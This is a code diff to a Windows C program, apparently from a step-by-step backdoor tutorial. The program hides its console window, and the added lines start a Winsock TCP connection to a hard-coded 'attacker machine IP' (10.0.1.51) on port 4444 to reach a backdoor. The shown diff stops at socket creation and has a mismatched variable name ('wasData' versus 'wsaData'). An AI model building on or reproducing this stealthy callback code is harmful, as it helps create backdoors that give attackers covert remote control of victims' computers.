@@ -35,4 +35,38 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //It take 2 arguments. 1 one handle windows that we specify earlier.
     // 2nd arg - is 0 - Hiding the current window and activate another window.
     ShowWindow(stealth, 0);
+
+    
+    //Let'Start to create a socket to begin the connection with the bacdoor.
+    //Let's create a structure of server address.(Similar to Class)
+
+    struct sockaddr_in ServAddr;
+    //let's assign server port.
+    unsigned short ServPort;
+    char *ServIP; //which point the memory address of the particular variable.
+    WSADATA wasData;//WSADATA is structure which consist with the windows socket informations.
+
+    ServIP = "10.0.1.51";//here must want to apply the attacker machine IP.
+    ServPort = 4444; //Make sure another process is not using same port.
+
+
+    //WSAStartup is initiate a process of winsock dll by a process.
+    //ifbsuccessful WSAStartup function will return 0 otherwise exit the program.
+
+    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
+    {
+      //MAKEWORD requests winsock major and minor version (2 and 0)
+      //&wsaData is a pointer to WSADATA structure which contain winsock implementation details.
+        exit(1);
+    }
+
+
+    //define the socket object
+    //must specify this variable function in out side of the main funtion. which can be able to access by other functions also.
+
+    //AF_INET is used to establish the connection using IPV4.
+    //SOCK_STREAM is used to establish tcp 3 way handshake with the target.
+    //0 is we not decline anything after connection establishment.
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
 }
